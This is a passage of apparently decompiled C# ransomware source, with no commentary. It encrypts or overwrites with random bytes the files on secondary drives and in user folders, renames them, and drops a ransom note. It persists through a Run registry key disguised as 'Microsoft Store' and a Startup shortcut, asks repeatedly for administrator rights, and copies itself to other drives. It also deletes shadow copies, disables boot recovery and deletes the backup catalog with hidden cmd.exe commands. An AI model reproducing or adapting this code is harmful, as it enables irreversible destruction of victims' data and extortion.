			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
